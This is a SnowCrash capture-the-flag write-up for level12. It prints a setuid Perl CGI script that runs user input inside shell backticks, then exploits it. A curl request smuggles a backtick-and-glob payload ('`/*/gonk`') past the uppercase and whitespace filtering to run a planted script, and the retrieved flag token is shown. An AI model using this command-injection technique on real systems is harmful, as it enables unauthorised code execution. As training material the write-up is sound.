# level12

## Perl CGI script with partially sanitized inputs

The hint file here is a Perl script.
```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ cat level12.pl
```
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

This Perl script only partially sanitizes its inputs by upcasing any lowercase letters and removing any whitespace characters.

However, this is inadequate as we can easily bypass this using path globbing to defeat the simple sanitization and shell backticks to execute our script.

```bash
level12@SnowCrash:~$
level12@SnowCrash:~$ echo 'getflag>/tmp/glag'>/tmp/GONK; chmod +x /tmp/GONK
level12@SnowCrash:~$ curl 'localhost:4646/level12.pl?x=`/*/gonk`'
..level12@SnowCrash:~$ cat /tmp/glag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ su level13
Password: g1qKMiRpXf53AWhDaU7FEkczr
level13@SnowCrash:~$ 
```
